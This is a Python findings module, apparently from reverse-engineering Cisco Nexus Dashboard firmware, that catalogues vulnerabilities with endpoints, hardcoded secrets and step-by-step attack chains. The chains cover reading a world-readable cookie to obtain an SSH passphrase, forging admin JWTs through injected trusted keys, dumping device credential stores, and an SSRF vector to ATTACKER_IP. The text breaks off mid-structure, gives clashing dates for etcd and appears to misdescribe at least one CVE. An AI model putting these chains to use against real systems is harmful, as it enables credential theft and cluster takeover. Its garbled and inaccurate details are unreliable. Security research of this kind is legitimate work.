"""
Cisco Nexus Dashboard 3.2.2m — RE Module
Firmware: nd-dk9.3.2.2m.qcow2 / nd-dk9.3.2.2m.iso
Build date: 2025-07-14 (kube14, Jenkins CI)
Architecture: x86-64, Kubernetes cluster (K8s 1.27.7), OCI containers via stacker

Extraction method:
  qemu-nbd -> GPT: p2 EFI, p3 boot, p4 LVM (vg_ifc0), p5 ext4 unified-cargo
  vg_ifc0 LVs: certs(32MB), config(1GB), logs(2GB), ThinDataLV thin-pool (22.5GB)
  p5 unified-cargo -> firmware.iso (11GB squashfs) -> oci_repo/apic-sn/* (200+ OCI containers)

Container stack (atomix.yaml, 20 core + 200+ app containers):
  k8bins:       K8s 1.27.7 + etcd 3.3.15 + kubectl
  cni-plugins:  1.0.1.23 + BIRD BGP speaker
  kms:          Go binary (kms.bin) + etcd 3.3.15 — cluster PKI root
  keyhole:      Python Flask — SE node management API
  bootstrap:    Helm + K8s CRDs + CIMC provisioning expect scripts
  agent:        ND management agent
  falcon:       Security monitoring
  infra/etcd:   K8s etcd (separate from kms etcd)
  infra/kafka:  Kafka + ZooKeeper
  infra/mongodb: MongoDB + mongodb-exporter
  infra/opensearch: OpenSearch (ex-Elasticsearch)
  infra/apigw:  API gateway (JWT auth)
  infra/aaamgr/aaaserver: AAA authentication server
  apps/cisco-mso: 22 MSO microservices
  apps/cisco-ndfc: 32 NDFC (fabric controller) services
  apps/cisco-nir: 60+ NIR telemetry analysis services

Findings: ND-F01 (CRITICAL) through ND-F20 (HIGH)
"""

import socket
import struct
import ssl
import json
import urllib.request
import urllib.parse
import os
import subprocess


# ─── Finding Metadata ───────────────────────────────────────────────────────

FINDINGS = {
    "ND-F01": {
        "title": "Keyhole World-Readable Admin Cookie — Filesystem Read = Full API Control",
        "severity": "CRITICAL",
        "component": "keyhole Flask server (keyhole_server.py)",
        "description": (
            "keyhole_server.py authenticates all requests via a shared cookie stored at "
            "/var/run/admin.cookie with chmod 644 (world-readable). The 15-character "
            "uppercase-ASCII cookie is generated with random.SystemRandom() then written "
            "world-readable: os.chmod(ADMIN_COOKIE, 0o644). Any process on the ND host "
            "with filesystem read access — including any container with a host volume "
            "mount — can read this file and gain full control of the keyhole API."
        ),
        "surface": "Flask REST API on SE nodes, port bound to local socket",
        "auth_mechanism": "?cookie= query param compared to /var/run/admin.cookie",
        "cookie_path": "/var/run/admin.cookie",
        "cookie_permissions": "0o644 (world-readable, root-owned)",
        "cookie_entropy": "26^15 ≈ 1.68e21 (uppercase ASCII, 15 chars)",
        "exposed_endpoints": [
            "GET /keyhole/api/v1/passphrase — returns SSH passphrase from /data/services/issh/token/passphrase",
            "GET /keyhole/api/v1/dbgtoken — returns debug challenge token",
            "GET /keyhole/api/v1/reboot/<option> — reboots node (regular/clean/factory-reset)",
            "GET /keyhole/api/v1/shutdown — shuts down node",
            "GET /keyhole/api/v1/system-config — returns syscfg.yaml (node topology, minus admin_passwd)",
            "GET /keyhole/api/v1/show/cluster/json — K8s cluster node list",
            "GET /keyhole/api/v1/kafka/... — Kafka consumer group cleanup",
            "GET /keyhole/api/v1/techsupport — collect/clean tech support bundles",
        ],
        "lateral_path": (
            "Container escape OR any mounted host volume read -> cat /var/run/admin.cookie "
            "-> call /keyhole/api/v1/passphrase -> SSH passphrase for node "
            "-> call /keyhole/api/v1/show/cluster/json -> K8s ServiceAccount token path"
        ),
    },
    "ND-F02": {
        "title": "Keyhole Passphrase and Debug Token Endpoints — Direct SSH Credential Disclosure",
        "severity": "CRITICAL",
        "component": "keyhole_server.py /api/v1/passphrase + /api/v1/dbgtoken",
        "description": (
            "The keyhole Flask server exposes two endpoints that return live SSH credentials "
            "behind only the world-readable admin cookie (see ND-F01). "
            "/keyhole/api/v1/passphrase returns the contents of "
            "/data/services/issh/token/passphrase — the passphrase used to unlock the "
            "ifc_admin SSH key. /keyhole/api/v1/dbgtoken returns the challenge plugin "
            "token from /data/services/issh/token/challenge.plugin. "
            "keyhole_server.py logs filter these endpoints (SensitiveFilter class strips "
            "/api/v1/passwd and /api/v1/rma from werkzeug logs) but /passphrase and "
            "/dbgtoken are not filtered — responses appear in keyhole.log."
        ),
        "passphrase_path": "/data/services/issh/token/passphrase",
        "dbgtoken_path": "/data/services/issh/token/challenge.plugin",
        "shadow_path": "/data/services/issh/token/ifc_admin.shadow",
        "rescue_user_kubeconfig": "/home/rescue-user/.kube/config",
        "chain": "ND-F01 cookie read -> passphrase endpoint -> SSH node access -> K8s cluster control",
    },
    "ND-F03": {
        "title": "etcd 3.3.15 Backs KMS — Auth Bypass CVEs Against Platform PKI Root",
        "severity": "CRITICAL",
        "component": "kms container: etcd 3.3.15 (2019), kms.bin Go binary",
        "description": (
            "The Nexus Dashboard Key Management Service (kms.bin) uses etcd 3.3.15 as its "
            "backing store for ALL service private keys across the entire cluster. "
            "etcd 3.3.15 (released January 2020) has two critical auth bypass CVEs: "
            "CVE-2020-15115 (no password length enforcement, allows brute-force) and "
            "CVE-2021-28235 (unauthenticated key read/write via crafted /auth/token/revoke). "
            "start-kms.sh does not configure etcd auth (no etcdctl auth enable, no root "
            "user creation visible in startup script). etcd binds to non-default ports "
            "3379/3380 (obscurity, not security). "
            "kms.bin listens on :7777 (gRPC mTLS), :9989 (external TLS), :9969 (internal TLS). "
            "GODEBUG=x509sha1=1 is set — all certificates use SHA1."
        ),
        "etcd_version": "3.3.15 (2020-01-24, Go 1.12.9)",
        "etcd_ports": "3379 (client), 3380 (peer) — non-default",
        "kms_ports": "7777 (gRPC), 9989 (external TLS), 9969 (internal TLS)",
        "kms_binary": "kms.bin Go PIE ELF64, stripped, BuildID LYhJoTvCDDsu2q9q_uOv/...",
        "cve": ["CVE-2020-15115", "CVE-2021-28235"],
        "godebug": "x509sha1=1 — SHA1 certificates throughout KMS",
        "impact": (
            "etcd compromise = read all KMS stored keys = exfiltrate private keys for "
            "Kubernetes, Kafka, OpenSearch, MongoDB, apigw, firmwared, confd, aaamgr, "
            "aaaserver, eventmgr, all MSO/NDFC/NIR service mTLS certs (80+ certificate entries "
            "in platformgencertlocations.yaml). Full cluster mTLS collapse."
        ),
        "sam_config": {
            "sslConfigPath": "/ssl/",
            "sslCaCertPath": "/cacerts/",
            "portOffset": 12007,
            "logDirectory": "/data/log",
            "networkConnectTimeout": 500,
        },
        "app_users": [
            {"service": "Cisco_NIR", "cn": "Cisco_SN_NIR", "privilege": "all/admin/"},
            {"service": "Cisco_NIA", "cn": "Cisco_SN_NIA", "privilege": "all/admin/"},
            {"service": "Cisco_IntersightDC", "cn": "Cisco_SN_IntersightDC", "privilege": "all/admin/"},
        ],
    },
    "ND-F04": {
        "title": "genappcerts.sh — 20-Year Self-Signed RSA Certs, No SAN, SHA1 Forced",
        "severity": "HIGH",
        "component": "kms container: genappcerts.sh + appusers.yaml",
        "description": (
            "genappcerts.sh generates app-user certificates using: "
            "openssl genrsa -out <key> 2048 && "
            "openssl req -new -days 7300 -nodes -x509 -key <key> -subj '/C=US/ST=CA/O=Cisco Systems/CN=<cn>' "
            "-out <cert>. Issues: (1) self-signed (-x509 flag, no CA signing), "
            "(2) 20-year validity (7300 days), (3) no SAN extension, "
            "(4) CN-only hostname binding (deprecated, RFC 6125 non-compliant). "
            "All three app users are granted ciscoAvPair: all/admin/ — platform admin. "
            "GODEBUG=x509sha1=1 in start-kms.sh overrides Go's SHA1 deprecation for all "
            "certificate operations in the kms container."
        ),
        "cert_validity_days": 7300,
        "cert_type": "RSA 2048-bit self-signed",
        "san": "None — CN only",
        "app_cert_path": "/securedata/certs/v1/apps/<service>/",
        "chain": "ND-F03 etcd bypass -> read securedata -> exfiltrate app-user private keys -> platform admin",
    },
    "ND-F05": {
        "title": "rescue-user K8s ServiceAccount Pre-Provisioned With Cluster-Wide Read Access",
        "severity": "HIGH",
        "component": "bootstrap container: configs/rescue-user/rescue-user.yaml",
        "description": (
            "Every ND cluster provisions a rescue-user Kubernetes ServiceAccount "
            "with a ClusterRoleBinding granting read access to: "
            "endpoints, services, pods, pods/log, namespaces, deployments, jobs, nodes, "
            "apps, events, firmwares, leases, all, releases, lifecycles, servicepackages, "
            "customresourcedefinitions (apiGroups: core, extensions, apps, batch, "
            "case.cncf.io, metrics.k8s.io). "
            "The token secret (rescue-user-token) is referenced in keyhole_server.py at "
            "RESCUE_USER_CONFIG = /home/rescue-user/.kube/config. "
            "Combined with ND-F01+F02: keyhole cookie -> SSH access -> kubeconfig -> "
            "K8s cluster enumeration as rescue-user."
        ),
        "namespace": "rescue-user",
        "service_account": "rescue-user",
        "token_secret": "rescue-user-token (kubernetes.io/service-account-token)",
        "cluster_role": "system:rescue-user (cluster-wide read on core resources + case.cncf.io CRDs)",
        "kubeconfig_path": "/home/rescue-user/.kube/config",
    },
    "ND-F06": {
        "title": "OCI Image Annotations Embed Full CI Pipeline — SSH Keys, Internal Hosts, Proxy",
        "severity": "HIGH",
        "component": "All OCI image manifests (stacker YAML in io.stackeroci.stacker.stacker_yaml annotation)",
        "description": (
            "Every OCI container image in the ND image store includes a "
            "io.stackeroci.stacker.stacker_yaml annotation containing the complete CI build "
            "script used to produce that layer. These annotations expose: "
            "(1) SSH key path used during build: "
            "secretFiles/23cd94a3-27bb-4cc2-a11d-97b6cfccb652/ssh-key-GH_SSH_KEY "
            "(referenced in both uiassets and bootstrap build configs); "
            "(2) Internal container registries: aci-docker-reg.cisco.com, aci-zot.cisco.com:5000; "
            "(3) Internal artifact repositories: aci-artifactory-001.insieme.local:8081, "
            "devops-centos7-atom1.insieme.local:8081; "
            "(4) Internal Git server: aci-github.cisco.com; "
            "(5) Corporate HTTP proxy: insbulab-proxy.insieme.local:8080; "
            "(6) Build host: kube14, CI: Jenkins RELEASE_ND_CORE_INTEGRATION; "
            "(7) StrictHostKeyChecking=no in all git SSH operations."
        ),
        "exposed_assets": [
            "SSH key ID: 23cd94a3-27bb-4cc2-a11d-97b6cfccb652/ssh-key-GH_SSH_KEY",
            "Container registry: aci-docker-reg.cisco.com",
            "OCI registry: aci-zot.cisco.com:5000",
            "Artifactory: aci-artifactory-001.insieme.local:8081",
            "NPM registry: devops-centos7-atom1.insieme.local:8081",
            "Git server: aci-github.cisco.com",
            "HTTP proxy: insbulab-proxy.insieme.local:8080",
            "Build host: kube14",
        ],
        "build_path": "/home/jenkins/agent/workspace/Production/ND/ND_RELEASE/RELEASE_ND_CORE_INTEGRATION/",
        "retrieval": "squashfs-root/oci_repo/apic-sn/<service>/blobs/sha256/<manifest-hash>",
    },
    "ND-F07": {
        "title": "Component Version Inventory — K8s 1.27.7 (EOL), CRI-O 1.18.4, React 16, etcd 3.3.15",
        "severity": "HIGH",
        "component": "atomix.yaml layer manifest + OCI config blobs",
        "description": (
            "Version inventory from atomix.yaml and OCI image configs: "
            "Kubernetes 1.27.7.27 (EOL April 2024; CVE-2023-5528 node filesystem escape via hostPath); "
            "CRI-O 1.18.4.18 (2021, 5 years behind, multiple unpatched CVEs); "
            "etcd 3.3.15 in KMS (see ND-F03); "
            "React 16.13.1 (EOL April 2022) in management UI; "
            "Node.js 14.18.1 (EOL April 2023) used in UI build; "
            "Helm v3.13.3 in bootstrap; "
            "BIRD BGP speaker with hardcoded templates for ACI spine connectivity; "
            "MongoDB (version in app-mongodb container, not yet extracted); "
            "OpenSearch (formerly Elasticsearch, version TBD)."
        ),
        "versions": {
            "kubernetes": "1.27.7.27 (EOL 2024-04)",
            "cri_o": "1.18.4.18 (2021)",
            "etcd_kms": "3.3.15 (2020)",
            "react": "16.13.1 (EOL 2022)",
            "nodejs_build": "14.18.1 (EOL 2023)",
            "helm": "v3.13.3",
            "kafka": "see infra/kafka container",
            "zookeeper": "see infra/zk container",
        },
        "cve_surface": [
            "CVE-2023-5528: K8s hostPath volume node filesystem escape (CVSS 7.2)",
            "CVE-2020-15115 / CVE-2021-28235: etcd 3.3.15 auth bypass",
        ],
    },
    "ND-F08": {
        "title": "keyhole Inter-Service TLS verify=False — MITM on firmwared Communication",
        "severity": "MEDIUM",
        "component": "keyhole_server.py get_deployment_mode()",
        "description": (
            "keyhole_server.py calls the firmwared service with TLS verification disabled: "
            "requests.get('https://firmwared.firmwared.svc/api/v1/deployment', verify=False). "
            "If the cluster network is compromised (e.g., CNI/BGP speaker poisoning via "
            "BIRD template injection or K8s service re-routing), an attacker can intercept "
            "and modify deployment mode responses. firmwared controls firmware update state "
            "for all physical ND nodes — a MITM response could redirect firmware update "
            "targets or suppress firmware update operations."
        ),
        "affected_function": "get_deployment_mode() -> requests.get(url, verify=False)",
        "target_service": "firmwared.firmwared.svc",
        "impact": "Deployment mode spoofing; firmware update misdirection",
        "chain": "CNI/BGP poisoning -> MITM firmwared -> malicious deployment mode",
    },
    "ND-F09": {
        "title": "acs Admin CLI Leaks Credentials as URL Query Parameters — Logged Unredacted",
        "severity": "HIGH",
        "component": "acs Python admin shell (/usr/bin/acs in loginsh container)",
        "description": (
            "The acs admin CLI constructs keyhole API URLs with credentials embedded as "
            "GET query parameters, not POST bodies or headers. Three credential types exposed: "
            "(1) acs rma: /keyhole/api/v1/rma?controllerip=<ip>&controlleruser=<user>&controllerpsw=<cimc_password> "
            "— CIMC/iDRAC BMC password in URL; "
            "(2) acs upgrade update: /keyhole/api/v1/upgrade/update?filepath=<path>&peer_password=<nd_admin_password> "
            "— ND admin password in URL; peer_password is NOT in keyhole's SensitiveFilter "
            "class (which only strips /api/v1/passwd and /api/v1/rma), so it appears "
            "unredacted in keyhole.log on every upgrade; "
            "(3) acs node-join: /keyhole/api/v1/nodejoin?passphrase=<passphrase> "
            "— cluster join passphrase in URL. "
            "Additionally, acs kubectl proxies kubectl commands: "
            "/keyhole/api/v1/kubectl?args=<cmd> allows kubectl execution on the ND node "
            "authenticated only by the world-readable cookie (ND-F01)."
        ),
        "affected_commands": {
            "acs rma": "/keyhole/api/v1/rma?controllerip={}&controlleruser={}&controllerpsw={}",
            "acs upgrade update": "/keyhole/api/v1/upgrade/update?filepath={}&peer_password={}",
            "acs node-join": "/keyhole/api/v1/nodejoin?passphrase={}",
            "acs kubectl": "/keyhole/api/v1/kubectl?args={}",
        },
        "logging_gap": "peer_password not in SensitiveFilter — logged unredacted in keyhole.log",
        "keyhole_sensitive_filter": ["api/v1/passwd", "api/v1/rma"],
        "filepath_schemes": ["file://", "http://", "https://", "peer://NODE_IP"],
        "chain": "ND-F01 cookie + keyhole.log read -> exfiltrate ND admin password, CIMC password, join passphrase",
    },
    "ND-F10": {
        "title": "aaaserver TrustedJWTKeys Injection — Forge Admin JWT for Cluster-Wide Auth Bypass",
        "severity": "CRITICAL",
        "component": "aaaserver REST API (0.0.0.0:7770 HTTPS), resource aaa/v4.TrustedJWTKeys",
        "description": (
            "aaaserver exposes a TrustedJWTKeys resource via REST (POST/PUT) that allows "
            "injection of attacker-controlled RSA public keys as trusted JWT signing anchors. "
            "aaaserver_config.json lists 'aaa/v4.TrustedJWTKeys' with methods POST and PUT "
            "permitted. An attacker who can reach aaaserver:7770 (reachable from within the "
            "cluster, or with mTLS cert from ND-F03) can POST their own public key as a "
            "TrustedJWTKey, then sign JWTs with the corresponding private key and "
            "claim arbitrary privileges (ciscoAvPair: all/admin/). "
            "The aaaserver config shows Kafka topic publishing to kafka-svc.kafka:9092 (mTLS) "
            "and MongoDB on mongodb.mongodb.svc:27017 (TLS) — injected keys persist across restarts. "
            "aaaserver is ND's AAA root — all Kubernetes RBAC and ND API JWT validation flows "
            "through it."
        ),
        "endpoint": "POST|PUT https://aaaserver:7770/aaa/v4/TrustedJWTKeys",
        "aaaserver_config": {
            "rest_port": 7770,
            "rest_bind": "0.0.0.0",
            "tls": True,
            "kafka": "kafka-svc.kafka:9092 (mTLS)",
            "mongodb": "mongodb.mongodb.svc:27017 (TLS)",
        },
        "attack": (
            "1. Generate RSA-2048 keypair (openssl genrsa); "
            "2. POST public key to /aaa/v4/TrustedJWTKeys authenticated via mTLS cert (from ND-F03) "
            "or cluster-internal access; "
            "3. Craft JWT: sub=<any-user>, ciscoAvPair=all/admin/, sign with private key; "
            "4. Present JWT to any ND API endpoint -> full admin access"
        ),
        "chain": "ND-F03 etcd bypass -> app-user cert exfiltration -> POST TrustedJWTKey -> forge admin JWT",
    },
    "ND-F11": {
        "title": "apigw Tyk Default Admin Secret + Hardcoded API Key — Full Gateway Control",
        "severity": "HIGH",
        "component": "infra/apigw — Tyk API Gateway 2.x",
        "description": (
            "The Nexus Dashboard API gateway uses Tyk with the unchanged factory-default "
            "admin secret across all three shipped configuration files "
            "(tyk.conf.example, tyk.self_contained.conf, tyk.with_dash.conf): "
            "secret = '352d20ee67be67f6340b4c0605b044b7'. "
            "This is the well-known Tyk default, documented in public CVE disclosures. "
            "A second hardcoded credential: jwt_api.key = '98762936529610954627283496573984' "
            "is stored in the OCI image at /opt/tyk-gateway/jwt_api.key. "
            "With the admin secret, an attacker can: create/delete API keys, "
            "modify API definitions, add policies, and inject new APIs via "
            "POST /tyk/apis (x-tyk-authorization: 352d20ee67be67f6340b4c0605b044b7). "
            "The apigw container has 17 custom Go .so middleware plugins "
            "(login_handler, msologin, oidccallback, otp, certlogin, authcheck, denyrole, "
            "etc.) — each plugin is an independent auth bypass surface in the gateway pipeline."
        ),
        "tyk_admin_secret": "352d20ee67be67f6340b4c0605b044b7",
        "jwt_api_key": "98762936529610954627283496573984",
        "org_id_hardcoded": "436973636f204150494320414141",
        "org_id_decoded": "Cisco APIC AAA",
        "custom_plugins": [
            "login_handler.so", "certlogin_handler.so", "logout_handler.so",
            "refresh_handler.so", "header_handler.so", "k8header_handler.so",
            "msologin.so", "authcheck_handler.so", "whoami_handler.so",
            "launch_handler.so", "otp_handler.so", "oidccallback_handler.so",
            "token_handler.so", "health_handler.so", "changepassword_handler.so",
            "denyrole.so", "denyhttpmethods_handler.so", "xlaunch_handler.so",
        ],
        "tyk_admin_api": "POST /tyk/apis, GET /tyk/keys, DELETE /tyk/keys/<key-id>",
        "chain": "network access to apigw -> POST /tyk/apis with default secret -> inject open policy -> bypass all ND auth",
    },
    "ND-F12": {
        "title": "firmwared Dual Signing Key Architecture — Dev Key in Prod Image + SSRF via peer://",
        "severity": "HIGH",
        "component": "firmwared Go binary + firmwared-config.json + acs upgrade command",
        "description": (
            "firmwared uses PKCS1v15 RSA-2048 signature verification against two embedded "
            "public keys: AbraxasACI.pem (production firmware signing key) and "
            "AbraxasACIDev.pem (development signing key). The development key is present "
            "in the production firmware image (3.2.2m), creating a second trusted signing "
            "anchor with an unknown-custody private key. "
            "firmwared exposes /api/v1/firmware/upload for direct firmware blob upload "
            "on port 443 (TLS), accessible from ND-internal services. "
            "SSRF: the acs upgrade update command accepts filepath=peer://NODE_IP, causing "
            "firmwared to initiate an outbound connection to the specified IP — usable for "
            "internal network discovery and SSRF against cluster-internal services. "
            "firmwared uses etcd v3 for state storage and containers/ocicrypt for "
            "AES-256-GCM layer encryption of OCI firmware blobs."
        ),
        "abraxas_aci_pem": (
            "-----BEGIN PUBLIC KEY-----\n"
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Byzms13j1UY/5eV/kDw\n"
            "AuIUUViKLeL6Vth58sN6MFk6b5gjBZHPlvtzljNFIS++xsqi63V4iVwYGxD/OC2O\n"
            "mNUAHnY1z+IKSjh5xAwCUTj44KCyMslbiCNPDLN3uuPb8z+1BwQJ1a04mnoRsmRo\n"
            "dQOiXLJGNxTofUW7zI0UDK7L3+2zZnbUWgvZsrLW/GVeAKZBMw9D073i4cnpO60O\n"
            "477aWKP9yjAMs3koqtfFnWVRPwPEjZu7ZVR9z2t7QWb4+vT98GwCoNiWpdSRXmrS\n"
            "bMbBiOeq6XAUN3jEmNfbw7dvn5DDY1PjQxjRccbtMOHIk+ivqxj5spKYEt4b0eDP\n"
            "QwIDAQAB\n"
            "-----END PUBLIC KEY-----"
        ),
        "abraxas_aci_dev_pem": (
            "-----BEGIN PUBLIC KEY-----\n"
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA60ymvh7yo2nJgLDJJ6HS\n"
            "2kDlVg51syBc6nmVTTBZDKyMYeIUZ5NDEIiLjSSXD+Bqcz2t2t9BkVGgO1UhMkyz\n"
            "zO/Xe3aeRfSZBRaHl1jDQ7k6/r/ASefwa6pe35PvFjljiqj+9kYliXJv87Igb4g7\n"
            "IhEA/60XAWvqFamXwQ07dD+iSB7XPYhptYtkz8fp0Tp/miwJvd08TkHGBOuUV3Ea\n"
            "xcoMeYgWI9yNdoZAiFzGXZM/HoviLaSfxUACW4GL4STWOEmy3hniZInk1HJIEsQN\n"
            "qyO6qNiVjPKxyO70twxmUY3kC6wY64k32gU6AA0iFmwcfDNmUX3ZArIBAbxx3aaI\n"
            "zQIDAQAB\n"
            "-----END PUBLIC KEY-----"
        ),
        "firmware_upload_endpoint": "POST /api/v1/firmware/upload (port 443, TLS)",
        "ssrf_vector": "acs upgrade update filepath=peer://ATTACKER_IP -> firmwared outbound connection",
        "encryption": "containers/ocicrypt AES-256-GCM layer encryption",
        "chain": "dev key present in prod -> unsigned dev builds accepted -> firmware replacement; peer:// SSRF -> internal pivot",
    },
    "ND-F13": {
        "title": "acs deployment clean-wipe — Destructive Wipe Protected Only by World-Readable Cookie",
        "severity": "MEDIUM",
        "component": "acs Python admin shell — deployment clean-wipe command",
        "description": (
            "The acs admin CLI exposes a deployment clean-wipe subcommand "
            "(acs deployment clean-wipe --service [ndi|ndfc|ndo]) that permanently deletes "
            "all application data and state for the specified service. "
            "The only access control is the world-readable admin.cookie (ND-F01). "
            "Any attacker who has obtained the cookie can destroy the entire ND data plane "
            "— all fabric management state, policy configurations, and operational history — "
            "with a single HTTP GET request to keyhole. No confirmation required, no RBAC, "
            "no audit trail beyond keyhole.log."
        ),
        "command": "acs deployment clean-wipe --service [ndi|ndfc|ndo]",
        "services_affected": ["ndi (Nexus Dashboard Insights)", "ndfc (Fabric Controller)", "ndo (Orchestrator)"],
        "access_control": "world-readable cookie only (ND-F01)",
        "chain": "ND-F01 cookie -> clean-wipe all services -> full operational data destruction",
    },
    "ND-F17": {
        "title": "securitymgr CA Passphrase Debug Endpoint — Cluster CA Key Decryption via GET",
        "severity": "CRITICAL",
        "component": "securitymgr binary (port 8989) + confd debug API (port 19999)",
        "description": (
            "securitymgr exposes the current CA certificate request passphrase via the "
            "confd debug API at GET /api/debug/passphraseresp. "
            "Response: SecmgrCAPassphraseResp { currCertReqPassphrase: '<passphrase>', "
            "currCertReqPassphraseExpiry: '<datetime>' }. "
            "This passphrase is used to decrypt/operate the ND cluster CA private key. "
            "With the CA passphrase, an attacker can: decrypt the CA private key from "
            "the KMS etcd store (ND-F03), issue arbitrary TLS certificates for any ND "
            "service, forge mTLS client certs for any cluster microservice, and MITM "
            "all inter-service TLS traffic. "
            "A second related endpoint: POST /api/debug/passphrase (SecmgrCAPassphraseReq) "
            "requests a fresh CA passphrase (reqID only), suggesting passphrase rotation "
            "is also debug-accessible. "
            "Additionally: GET /api/debug/ securitymgr token endpoint returns "
            "SecmgrTokenResp { caCert, currToken, oldToken, tokenExpiry } — "
            "the current CA certificate and active signing token."
        ),
        "endpoints": {
            "GET /api/debug/passphraseresp": "returns currCertReqPassphrase (CA key passphrase)",
            "POST /api/debug/passphrase": "request CA passphrase rotation; reqID only",
        },
        "response_fields": {
            "currCertReqPassphrase": "passphrase to decrypt CA private key",
            "currCertReqPassphraseExpiry": "expiry timestamp",
        },
        "securitymgr_port": 8989,
        "confd_debug_port": 19999,
        "chain": (
            "ND-F03 etcd bypass -> app-user mTLS cert -> confd debug API -> "
            "GET /api/debug/passphraseresp -> CA passphrase -> "
            "decrypt CA private key -> sign arbitrary certs for any cluster service -> "
            "full mTLS impersonation"
        ),
    },
    "ND-F18": {
        "title": "securitymgr Credential Store Dump — ACI/Nexus Device Passwords via Debug API",
        "severity": "CRITICAL",
        "component": "securitymgr + confd debug API, CredmsCredStore schema",
        "description": (
            "The credential store managed by securitymgr contains device credentials "
            "for all ACI APIC fabric controllers, Nexus switches, and managed sites "
            "that ND supervises. Three retrieval paths: "
            "(1) GET /api/debug/class/credentialstore — returns ALL credential stores; "
            "(2) GET /api/debug/dn/credentialstore/{owner} — get by owner (ACI site name); "
            "(3) POST /api/config/getcredentials — production path, retrieves by owner + reqID. "
            "Credential store structure (CredmsCredStore): "
            "{ owner: '<site-name>', components: { '<apic>': { credentials: "
            "{ 'username': '...', 'password': '...' }, sharedWith: [...] } }, updated: '<ts>' }. "
            "The components.credentials field is a Name/Value pair map — passwords are "
            "stored as credentials values. The securitymgr backend is MongoDB "
            "(mongodb.mongodb.svc:27017) — if MongoDB lacks auth (common in K8s-internal "
            "services), direct DB access also yields all credentials. "
            "ACI App User operations: POST /api/debug/acisiteappuser returns "
            "SecmgrACIAppUserResp { cert: '<X509 PEM>', key: '<PRIVATE KEY PEM>' } — "
            "securitymgr generates and RETURNS the private key for ACI app user certs."
        ),
        "endpoints": {
            "GET /api/debug/class/credentialstore": "dump all credential stores",
            "GET /api/debug/dn/credentialstore/{owner}": "get creds by ACI site owner",
            "POST /api/config/getcredentials": "retrieve specific device credentials",
            "POST /api/debug/acisiteappuser": "returns ACI app user cert + private key",
        },
        "credential_schema": {
            "owner": "ACI site / managed device name",
            "components.<device>.credentials": "Name/Value map with username/password",
            "components.<device>.sharedWith": "services granted access to these creds",
        },
        "backend": "MongoDB mongodb.mongodb.svc:27017",
        "chain": (
            "ND-F03 mTLS cert OR ND-F16 confd debug access -> "
            "GET /api/debug/class/credentialstore -> "
            "all ACI APIC admin passwords + Nexus fabric credentials -> "
            "lateral movement to ALL managed ACI fabrics and data center switches"
        ),
    },
    "ND-F15": {
        "title": "signdata: Snakeoil + Dev TPM/LUKS Signing Keys + Pre-Signed Production Hardware Policies",
        "severity": "CRITICAL",
        "component": "signdata OCI container (policy-2/ directory, 87 total policies)",
        "description": (
            "The signdata container ships 7 public keys across three trust tiers "
            "(release, dev, snakeoil) in ALL production ND firmware images. "
            "Alongside the 7 public keys are 87 pre-signed TPM authorization policies "
            "organized by PCR hash measurement. Policy categories by key:key_type: "
            "snakeoil:production (4 entries for m6, qemu, ucs-c225m6-huu-4.2.2f), "
            "snakeoil:password (4), snakeoil:limited (4), "
            "dev:production (14 entries for UCS C225M6, QEMU, shim variants), "
            "dev:password (14), dev:limited (11), "
            "release:production (11), release:password (11), release:limited (14). "
            "Key finding: snakeoil-signed TPM policies are pre-authorized for physical "
            "UCS C225M6 hardware (ucs-c225m6-huu-4.2.2f, m6). The snakeoil and dev "
            "public keys are in the trusted keychain — any firmware signed with the "
            "corresponding snakeoil/dev private keys (likely in Cisco CI systems reachable "
            "via ND-F06) will be accepted by production hardware. "
            "info.json entries for dev:production hardware include: "
            "'RELrelease-on-DEVprovisioned-ucs-c225m6-4.2.2a' — production ND releases "
            "installed on hardware provisioned in dev mode accept dev-signed policies. "
            "This combines with ND-F12 (AbraxasACIDev key in firmwared) to form a pattern: "
            "Cisco ships dev/test signing keys across all firmware signing subsystems."
        ),
        "public_keys": {
            "luks-release.pem": "RSA-2048 prod LUKS unlock key",
            "tpmpass-release.pem": "RSA-2048 prod TPM passphrase key",
            "luks-dev.pem": "RSA-2048 dev LUKS unlock key (in prod image)",
            "tpmpass-dev.pem": "RSA-2048 dev TPM passphrase key (in prod image)",
            "luks-snakeoil.pem": "RSA-2048 snakeoil LUKS key (in prod image)",
            "tpmpass-snakeoil.pem": "RSA-2048 snakeoil TPM key (in prod image)",
        },
        "snakeoil_production_targets": [
            "m6 (UCS C225M6 hardware)",
            "ucs-c225m6-huu-4.2.2f (UCS C225M6 HUU firmware 4.2.2f)",
            "qemu (QEMU VM)",
        ],
        "policy_dir": "signdata/policy-2/<pcr-hash>/",
        "policy_files": ["tpm_luks.policy.signed", "tpm_passwd.policy.signed", "pcr_prod.bin", "pcr_tpm.bin", "pcr_limited.bin"],
        "format_doc": "aci-github.cisco.com/atom/atomix/blob/master/docs/sb/signdata-format.md",
        "chain": (
            "ND-F06 CI pivot -> exfiltrate snakeoil/dev private keys from Jenkins -> "
            "sign LUKS unlock request for UCS C225M6 hardware -> "
            "physical appliance storage accessible offline"
        ),
    },
    "ND-F16": {
        "title": "confd Debug API at /api/debug/* — Trusted CA Injection + Device Credential Harvest",
        "severity": "HIGH",
        "component": "confd Go binary, port 19999 TLS, /api/debug/* endpoints",
        "description": (
            "confd (ND configuration daemon) binds to 0.0.0.0:19999 with TLS and exposes "
            "all management endpoints under the path prefix /api/debug/. "
            "The 'debug' prefix in production API paths is a strong indicator of reduced "
            "authentication controls. Key endpoints: "
            "(1) POST /api/debug/ndtrustedcas — inject custom CA certificate as "
            "'ND Trusted CA'; requires only name + cert PEM; propagates via Kafka to "
            "all ND services that validate TLS against ND's trust store; "
            "(2) POST /api/debug/addapikey — add API key for managed network device "
            "(deviceUserName = ACI fabric / Nexus switch credential); "
            "(3) GET /api/debug/class/ndtrustedcas — enumerate all trusted CAs; "
            "(4) GET /api/debug/apikeysbyname — retrieve existing device API keys. "
            "confd uses MongoDB as its backend and Kafka for event distribution — "
            "an injected trusted CA propagates cluster-wide. "
            "All schemas have additionalProperties: true — likely permissive parsing."
        ),
        "port": 19999,
        "bind": "0.0.0.0",
        "tls": True,
        "backend": "mongodb.mongodb.svc:27017",
        "transport": "kafka (confd-topic)",
        "debug_endpoints": {
            "POST /api/debug/ndtrustedcas": "inject trusted CA cert cluster-wide",
            "GET /api/debug/class/ndtrustedcas": "list all trusted CAs",
            "POST /api/debug/addapikey": "add API key for managed device",
            "POST /api/debug/bulkaddapikey": "bulk add device API keys",
            "GET /api/debug/apikeysbyname": "retrieve device API keys by name",
            "POST /api/debug/devusers": "manage device user RBAC",
